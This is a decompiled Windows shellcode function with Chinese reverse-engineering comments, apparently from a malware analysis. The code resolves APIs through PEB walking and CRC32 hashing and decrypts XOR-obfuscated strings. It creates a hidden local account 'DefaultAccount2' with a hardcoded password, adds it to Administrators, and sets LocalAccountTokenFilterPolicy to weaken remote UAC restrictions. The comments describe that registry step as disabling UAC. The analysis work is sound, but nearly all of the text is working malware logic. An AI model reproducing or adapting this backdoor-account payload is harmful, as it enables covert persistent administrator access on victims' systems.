void __stdcall sub_1C0000()
{
  unsigned int v0; // edi
  __int64 (__fastcall *lp_LoadLibraryA)(int *); // rsi
  struct _LIST_ENTRY *v2; // r10
  struct _LIST_ENTRY *i; // r8
  struct _LIST_ENTRY *Flink; // r9
  int v5; // edx
  __int64 v6; // r11
  __int64 v7; // rax
  struct _LIST_ENTRY *v8; // r9
  _DWORD *v9; // rcx
  unsigned int *v10; // rbx
  char *v11; // r14
  unsigned int v12; // r12d
  char *v13; // r15
  char *v14; // r8
  unsigned __int8 v15; // dl
  unsigned int v16; // r11d
  int v17; // esi
  char v18; // al
  unsigned int v19; // ecx
  char v20; // al
  unsigned int v21; // edx
  unsigned int v22; // ecx
  int v23; // edx
  unsigned int v24; // ebx
  _DWORD *v25; // rcx
  unsigned int *v26; // r11
  __int64 v27; // r14
  unsigned int v28; // r12d
  __int64 v29; // r15
  unsigned __int8 v30; // dl
  char *v31; // r8
  unsigned int v32; // r9d
  int v33; // edi
  char v34; // al
  unsigned int v35; // ecx
  char v36; // al
  unsigned int v37; // edx
  unsigned int v38; // ecx
  int v39; // edx
  struct _LIST_ENTRY *lp_GetProcAddress; // rbx
  int v41; // ecx
  __int64 v42; // rax
  __int64 h_Netapi32_dll; // rax
  __int64 h_Netapi32_dll2; // rdi
  unsigned __int64 v45; // rcx
  __int64 (__fastcall *lp_func)(_QWORD, __int64, USER_INFO_1 *, unsigned __int64 *); // rax
  int v47; // eax
  int v48; // ecx
  unsigned __int64 v49; // rax
  __int64 (__fastcall *lp_NetLocalGroupAddMembers)(_QWORD, char *, __int64, PSID *, int); // rax
  int v51; // edx
  unsigned __int64 v52; // rcx
  int v53; // eax
  unsigned int v54; // ecx
  __int64 v55; // rax
  __int64 h_Advapi32; // rax
  __int64 v57; // rbx
  unsigned int v58; // r11d
  _DWORD *v59; // rcx
  unsigned int *v60; // r10
  __int64 v61; // r14
  unsigned int v62; // r12d
  __int64 v63; // r15
  unsigned __int8 v64; // dl
  char *v65; // r8
  unsigned int v66; // r9d
  int v67; // edi
  char v68; // al
  unsigned int v69; // ecx
  char v70; // al
  unsigned int v71; // edx
  unsigned int v72; // ecx
  int v73; // edx
  unsigned int (__fastcall *lp_RegCreateKeyExW)(unsigned __int64, char *, _QWORD, _QWORD, _DWORD, _DWORD, _QWORD, unsigned __int64 *, _QWORD); // r10
  unsigned __int64 j; // rax
  int v76; // esi
  unsigned int v77; // r11d
  _DWORD *v78; // rcx
  unsigned int *v79; // r10
  __int64 v80; // r14
  unsigned int v81; // r12d
  __int64 v82; // r15
  unsigned __int8 v83; // dl
  char *v84; // r8
  unsigned int v85; // r9d
  int v86; // edi
  char v87; // al
  unsigned int v88; // ecx
  char v89; // al
  unsigned int v90; // edx
  unsigned int v91; // ecx
  int v92; // edx
  void (__fastcall *lp_RegSetKeyValueW)(unsigned __int64, _QWORD, char *, __int64, unsigned __int64 *, int); // r10
  unsigned __int64 v94; // rax
  unsigned __int64 hKey; // rcx
  unsigned int v96; // r10d
  _DWORD *v97; // rcx
  unsigned int *v98; // r11
  __int64 v99; // rsi
  unsigned int v100; // r15d
  __int64 v101; // r14
  unsigned __int8 v102; // r9
  char *v103; // r8
  unsigned int v104; // edx
  int v105; // edi
  char v106; // al
  unsigned int v107; // ecx
  char v108; // al
  unsigned int v109; // edx
  unsigned int v110; // ecx
  int v111; // edx
  void (__fastcall *lp_RegCloseKey)(unsigned __int64); // rax
  int sz_NetUserAdd[3]; // [rsp+34h] [rbp-674h] BYREF
  int v114; // [rsp+40h] [rbp-668h]
  int v115[5]; // [rsp+44h] [rbp-664h]
  int v116; // [rsp+58h] [rbp-650h]
  int sz_Netapi32[365]; // [rsp+5Ch] [rbp-64Ch] BYREF
  unsigned __int64 *v118; // [rsp+610h] [rbp-98h]
  int v119; // [rsp+628h] [rbp-80h]
  int v120; // [rsp+62Ch] [rbp-7Ch]
  int v121; // [rsp+630h] [rbp-78h]
  unsigned int v122; // [rsp+638h] [rbp-70h]
  int v123; // [rsp+63Ch] [rbp-6Ch] BYREF
  WCHAR *v124; // [rsp+640h] [rbp-68h]
  __int64 v125; // [rsp+648h] [rbp-60h] BYREF
  __int64 v126; // [rsp+650h] [rbp-58h] BYREF
  __int64 v127; // [rsp+658h] [rbp-50h]
  __int64 v128; // [rsp+660h] [rbp-48h]
  __int64 v129; // [rsp+668h] [rbp-40h]
  __int64 v130; // [rsp+670h] [rbp-38h]
  __int64 v131; // [rsp+678h] [rbp-30h] BYREF
  __int64 v132; // [rsp+680h] [rbp-28h]
  __int64 v133; // [rsp+688h] [rbp-20h]
  __int64 v134; // [rsp+690h] [rbp-18h]
  unsigned __int64 v135; // [rsp+698h] [rbp-10h] BYREF
  unsigned __int64 v136; // [rsp+6A0h] [rbp-8h]
  unsigned __int64 retaddr; // [rsp+6A8h] [rbp+0h] BYREF
  __int64 v138; // [rsp+6E8h] [rbp+40h] BYREF
  unsigned __int64 v139; // [rsp+6F0h] [rbp+48h]
  unsigned __int64 v140; // [rsp+6F8h] [rbp+50h]
  unsigned __int64 v141; // [rsp+700h] [rbp+58h]
  unsigned __int64 v142; // [rsp+708h] [rbp+60h]
  unsigned __int64 v143; // [rsp+710h] [rbp+68h]
  unsigned __int64 v144; // [rsp+718h] [rbp+70h]
  unsigned __int64 v145; // [rsp+720h] [rbp+78h]
  unsigned __int64 v146; // [rsp+728h] [rbp+80h]
  unsigned __int64 v147; // [rsp+730h] [rbp+88h]
  unsigned __int64 v148; // [rsp+738h] [rbp+90h]
  unsigned __int64 v149; // [rsp+740h] [rbp+98h]
  unsigned __int64 v150; // [rsp+748h] [rbp+A0h]
  unsigned __int64 v151; // [rsp+750h] [rbp+A8h]
  unsigned __int64 v152; // [rsp+758h] [rbp+B0h]
  int v153; // [rsp+760h] [rbp+B8h]
  PSID pAdminGroupSid; // [rsp+768h] [rbp+C0h] BYREF
  USER_INFO_1 userInfo; // [rsp+770h] [rbp+C8h] BYREF
  int v156[274]; // [rsp+7A8h] [rbp+100h]

  v136 = 0i64;
  v135 = 0i64;
  v134 = 0i64;
  v133 = 99i64;
  v132 = 0x620041005E0035i64;
  v131 = 0x34003300320021i64;
  v130 = 0i64;
  v129 = 0i64;
  v128 = 0x320074006Ei64;
  v127 = 0x75006F00630063i64;
  v126 = 0x410074006C0075i64;
  v125 = 0x61006600650044i64;
  v124 = &v125;
  v118 = &retaddr;
  v0 = 0;
  lp_LoadLibraryA = 0i64;
  v2 = 0i64;
  for ( i = NtCurrentPeb()->Ldr->InLoadOrderModuleList.Flink; i[3].Flink; i = i->Flink )
  {
    Flink = i[6].Flink;
    v5 = 193207214;
    v114 = 193207214;
    v115[0] = 1710653125;
    v115[1] = 968325067;
    v115[2] = 1743290240;
    v115[3] = 193207214;
    if ( LOWORD(i[5].Blink) == 24 )
    {
      v6 = 0i64;
      while ( Flink )
      {
        if ( v5 )
        {
          v7 = 0i64;
          while ( 1 )
          {
            v115[v7] ^= v5;
            if ( ++v7 >= 4 )
              break;
            v5 = v114;
          }
          v5 = 0;
          v114 = 0;
        }
        if ( ((*(v115 + v6) - *(&Flink->Flink + v6)) & 0xFFFFFFDF) != 0 )
          Flink = 0i64;
        if ( ++v6 >= 12 )
        {
          if ( !Flink )
            break;
          v8 = i[3].Flink;
          v9 = (v8 + *(&v8[8].Blink + SHIDWORD(v8[3].Blink)));
          v10 = (v8 + v9[8]);
          v11 = v8 + v9[9];
          v12 = v9[6];
          v13 = v8 + v9[7];
          if ( v12 )
          {
            while ( 1 )
            {
              v14 = v8 + *v10;
              v15 = 0;
              do
              {
                v16 = v15;
                v17 = 8;
                do
                {
                  v18 = v16;
                  v19 = v16 >> 1;
                  v16 = (v16 >> 1) ^ 0xEDB88320;
                  if ( (v18 & 1) == 0 )
                    v16 = v19;
                  --v17;
                }
                while ( v17 );
                v156[v15++] = v16;
              }
              while ( v15 );
              v20 = *v14;
              v21 = -824981265;
              if ( *v14 )
              {
                do
                {
                  ++v14;
                  v22 = v21 >> 8;
                  v23 = v156[(v21 ^ v20)];
                  v20 = *v14;
                  v21 = v22 ^ v23;
                }
                while ( *v14 );
                if ( ~v21 == 1587755297 )
                  break;
              }
              ++v0;
              ++v10;
              if ( v0 >= v12 )
              {
                lp_LoadLibraryA = 0i64;
                goto LABEL_31;
              }
            }
            lp_LoadLibraryA = (v8 + *&v13[4 * *&v11[2 * v0]]);
          }
          if ( lp_LoadLibraryA )
            v2 = v8;
          goto LABEL_31;
        }
      }
    }
  }
LABEL_31:
  v24 = 0;
  v25 = (v2 + *(&v2[8].Blink + SHIDWORD(v2[3].Blink)));
  v26 = (v2 + v25[8]);
  v27 = v2 + v25[9];
  v28 = v25[6];
  v29 = v2 + v25[7];
  if ( v28 )
  {
    while ( 1 )
    {
      v30 = 0;
      v31 = v2 + *v26;
      do
      {
        v32 = v30;
        v33 = 8;
        do
        {
          v34 = v32;
          v35 = v32 >> 1;
          v32 = (v32 >> 1) ^ 0xEDB88320;
          if ( (v34 & 1) == 0 )
            v32 = v35;
          --v33;
        }
        while ( v33 );
        v156[v30++] = v32;
      }
      while ( v30 );
      v36 = *v31;
      v37 = -824981265;
      if ( *v31 )
      {
        do
        {
          ++v31;
          v38 = v37 >> 8;
          v39 = v156[(v37 ^ v36)];
          v36 = *v31;
          v37 = v38 ^ v39;
        }
        while ( *v31 );
        if ( ~v37 == 555469377 )
          break;
      }
      ++v24;
      ++v26;
      if ( v24 >= v28 )
        return;
    }
    lp_GetProcAddress = (v2 + *(v29 + 4i64 * *(v27 + 2i64 * v24)));
    if ( lp_GetProcAddress )
    {
      v41 = 1070733368;
      sz_Netapi32[0] = 0x5EA67D76;
      v116 = 1070733368;
      v42 = 0i64;
      v121 = 1070733368;
      v119 = 0xDE17148;
      v120 = 0x53BE7C16;
      while ( 1 )
      {
        sz_Netapi32[v42] ^= v41;                // 字符串解密
        if ( ++v42 >= 4 )
          break;
        v41 = v116;
      }
      v116 = 0;
      h_Netapi32_dll = lp_LoadLibraryA(sz_Netapi32);// 加载dll
      h_Netapi32_dll2 = h_Netapi32_dll;
      if ( h_Netapi32_dll )
      {
        sz_NetUserAdd[0] = 0x93F951E6;
        v45 = 0i64;
        sz_NetUserAdd[1] = 0x87FF51DB;
        sz_NetUserAdd[2] = 0xC68D50CC;
        do
          sz_NetUserAdd[v45++] ^= 0xC68D34A8;   // 字符串解密
        while ( v45 < 3 );
        lp_func = (lp_GetProcAddress)(h_Netapi32_dll, sz_NetUserAdd);// API获取NetUserAdd
        if ( lp_func )
        {
          LODWORD(STACK[0xBF0]) = 0;
          userInfo.usri1_name = v124;           //  "DefaultAccount2"
          userInfo.usri1_password = v124 + 24;  // "!2345^Abc"
          memset(&userInfo.usri1_password_age, 0, 40);
          userInfo.usri1_priv = 1;              // USER_PRIV_USER： 用户权限，默认为普通用户
          userInfo.usri1_flags = 1;             // 用户标志，默认为脚本执行标志
          v47 = lp_func(0i64, 1i64, &userInfo, &STACK[0xBF0]);// 添加用户
          if ( !v47 || v47 == 0x8B0 )
          {
            v48 = 2014082247;
            v126 = 0x225DDC482239DC09i64;
            LODWORD(v130) = 574217225;
            v49 = 0i64;
            v131 = 0x34781189780C74C7i64;
            v132 = 0xD630680146D17A8i64;
            v133 = 0x1A61118A1C6835B7i64;
            v134 = 2021590690i64;
            v127 = 0x2250DC672250DC64i64;
            v128 = 0x2258DC7B224DDC7Ai64;
            v129 = 0x224ADC7B2256DC7Di64;
            while ( 1 )
            {
              *(&v131 + ++v49) ^= v48;          // api 字符串解密
              if ( v49 >= 7 )
                break;
              v48 = v131;
            }
            LODWORD(v131) = 0;
            lp_NetLocalGroupAddMembers = (lp_GetProcAddress)(h_Netapi32_dll2, &v131 + 4);// API 获取 NetLocalGroupAddMembers
            if ( lp_NetLocalGroupAddMembers )
            {
              v51 = v126;
              pAdminGroupSid = userInfo.usri1_name;
              if ( v126 )
              {
                v52 = 0i64;
                while ( 1 )
                {
                  *(&v126 + ++v52) ^= v51;      // 可能解密了字符串 Administrators
                  if ( v52 >= 8 )
                    break;
                  v51 = v126;
                }
                LODWORD(v126) = 0;
              }
              v53 = lp_NetLocalGroupAddMembers(0i64, &v126 + 4, 3i64, &pAdminGroupSid, 1);// 参数2指向 Administrators
              if ( !v53 || v53 == 0x562 )
              {
                v54 = 0x883D88B4;
                v123 = 0xE94BECF5;
                v122 = 0x883D88B4;
                v55 = 0i64;
                LODWORD(v125) = 0x883D88B4;
                v124 = 0xE451EC9ABA0EE1C4i64;
                while ( 1 )
                {
                  *(&v123 + v55) ^= v54;        // 解密数据
                  if ( ++v55 >= 4 )
                    break;
                  v54 = v122;
                }
                v122 = 0;
                h_Advapi32 = lp_LoadLibraryA(&v123);// 加载 Advapi32.dll
                v57 = h_Advapi32;
                if ( h_Advapi32 )
                {
                  HIDWORD(v138) = -285232461;
                  v58 = 0;
                  v139 = 0xEEF1B2B7EEE4B2A6ui64;
                  v140 = 0xEEFDB2BCEEF5B2B2ui64;
                  v141 = 0xEEDFB292EED3B289ui64;
                  v142 = 0xEEC4B286EEDFB293ui64;
                  v143 = 0xEEDEB289EEE7B2BCui64;
                  v144 = 0xEEC3B297EEDFB284ui64;
                  v145 = 0xEEC2B295EEF3B2BCui64;
                  v146 = 0xEEC4B28EEED5B292ui64;
                  v147 = 0xEEC3B292EED5B2B6ui64;
                  v148 = 0xEEECB28EEEDFB289ui64;
                  v149 = 0xEED9B28CEEDFB2B0ui64;
                  v150 = 0xEEC3B285EED9B283ui64;
                  v151 = 0xEEC3B299EEE3B2BCui64;
                  v152 = 0xEEB0B28DEED5B294ui64;
                  v153 = 0;
                  v59 = (h_Advapi32 + *(*(h_Advapi32 + 60) + h_Advapi32 + 136));
                  v60 = (h_Advapi32 + v59[8]);
                  v61 = h_Advapi32 + v59[9];
                  v62 = v59[6];
                  v63 = h_Advapi32 + v59[7];
                  if ( v62 )
                  {
                    while ( 1 )
                    {
                      v64 = 0;
                      v65 = (v57 + *v60);
                      do
                      {
                        v66 = v64;
                        v67 = 8;
                        do
                        {
                          v68 = v66;
                          v69 = v66 >> 1;
                          v66 = (v66 >> 1) ^ 0xEDB88320;
                          if ( (v68 & 1) == 0 )
                            v66 = v69;
                          --v67;
                        }
                        while ( v67 );
                        v156[v64++] = v66;
                      }
                      while ( v64 );
                      v70 = *v65;
                      v71 = -824981265;
                      if ( *v65 )
                      {
                        do
                        {
                          ++v65;
                          v72 = v71 >> 8;
                          v73 = v156[(v71 ^ v70)];
                          v70 = *v65;
                          v71 = v72 ^ v73;
                        }
                        while ( *v65 );
                        if ( ~v71 == -1942999145 )
                          break;
                      }
                      ++v58;
                      ++v60;
                      if ( v58 >= v62 )
                        return;
                    }
                    lp_RegCreateKeyExW = (v57 + *(v63 + 4i64 * *(v61 + 2i64 * v58)));
                    if ( lp_RegCreateKeyExW )
                    {
                      STACK[0xC00] = 0i64;
                      for ( j = 0i64; j < 0x1E; ++j )
                        *(&v138 + j + 1) ^= 0xEEB0B2E0;
                      if ( !lp_RegCreateKeyExW(
                              0xFFFFFFFF80000002ui64,
                              &v138 + 4,        //  lpSubKey 要创建或者打开的注册表项 SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
                              0i64,
                              0i64,
                              0,
                              &samDesired,
                              0i64,
                              &STACK[0xC00],
                              0i64) )           // 接着打开注册表值"
                                                // SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"，设置键值"LocalAccountTokenFilterPolicy"的type为1，
                                                // 作用是禁用UAC功能
                      {
                        v76 = -72396853;
                        v135 = 0xFBC04F87FBAF4FCBui64;
                        v77 = 0;
                        v136 = 0xFBEE4FA7FBCE4FA8ui64;
                        retaddr = 0xFBDA4FA4FBCC4FA8ui64;
                        v78 = (v57 + *(*(v57 + 60) + v57 + 136));
                        v79 = (v57 + v78[8]);
                        v80 = v57 + v78[9];
                        v81 = v78[6];
                        v82 = v57 + v78[7];
                        if ( v81 )
                        {
                          while ( 1 )
                          {
                            v83 = 0;
                            v84 = (v57 + *v79);
                            do
                            {
                              v85 = v83;
                              v86 = 8;
                              do
                              {
                                v87 = v85;
                                v88 = v85 >> 1;
                                v85 = (v85 >> 1) ^ 0xEDB88320;
                                if ( (v87 & 1) == 0 )
                                  v85 = v88;
                                --v86;
                              }
                              while ( v86 );
                              v156[v83++] = v85;
                            }
                            while ( v83 );
                            v89 = *v84;
                            v90 = -824981265;
                            if ( *v84 )
                            {
                              do
                              {
                                ++v84;
                                v91 = v90 >> 8;
                                v92 = v156[(v90 ^ v89)];
                                v89 = *v84;
                                v90 = v91 ^ v92;
                              }
                              while ( *v84 );
                              if ( ~v90 == 1043443555 )
                                break;
                            }
                            ++v77;
                            ++v79;
                            if ( v77 >= v81 )
                              return;
                          }
                          lp_RegSetKeyValueW = (v57 + *(v82 + 4i64 * *(v80 + 2i64 * v77)));
                          if ( lp_RegSetKeyValueW )
                          {
                            LODWORD(STACK[0xBF8]) = 1;
                            v94 = 0i64;
                            while ( 1 )
                            {
                              *(&v135 + ++v94) ^= v76;
                              if ( v94 >= 0x10 )
                                break;
                              v76 = v135;
                            }
                            hKey = STACK[0xC00];
                            LODWORD(v135) = 0;
                            lp_RegSetKeyValueW(hKey, 0i64, &v135 + 4, 4i64, &STACK[0xBF8], 4);// 
                                                // 参数3:  lp_valueName: LocalAccountTokenFilterPolicy
                                                // 参数4： lpData : 1
                            v96 = 0;
                            v97 = (v57 + *(*(v57 + 60) + v57 + 136));
                            v98 = (v57 + v97[8]);
                            v99 = v57 + v97[9];
                            v100 = v97[6];
                            v101 = v57 + v97[7];
                            if ( v100 )
                            {
                              while ( 1 )
                              {
                                v102 = 0;
                                v103 = (v57 + *v98);
                                do
                                {
                                  v104 = v102;
                                  v105 = 8;
                                  do
                                  {
                                    v106 = v104;
                                    v107 = v104 >> 1;
                                    v104 = (v104 >> 1) ^ 0xEDB88320;
                                    if ( (v106 & 1) == 0 )
                                      v104 = v107;
                                    --v105;
                                  }
                                  while ( v105 );
                                  v156[v102++] = v104;
                                }
                                while ( v102 );
                                v108 = *v103;
                                v109 = -824981265;
                                if ( *v103 )
                                {
                                  do
                                  {
                                    ++v103;
                                    v110 = v109 >> 8;
                                    v111 = v156[(v109 ^ v108)];
                                    v108 = *v103;
                                    v109 = v110 ^ v111;
                                  }
                                  while ( *v103 );
                                  if ( ~v109 == -1605206293 )
                                    break;
                                }
                                ++v96;
                                ++v98;
                                if ( v96 >= v100 )
                                  return;
                              }
                              lp_RegCloseKey = (v57 + *(v101 + 4i64 * *(v99 + 2i64 * v96)));
                              if ( lp_RegCloseKey )
                                lp_RegCloseKey(STACK[0xC00]);
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}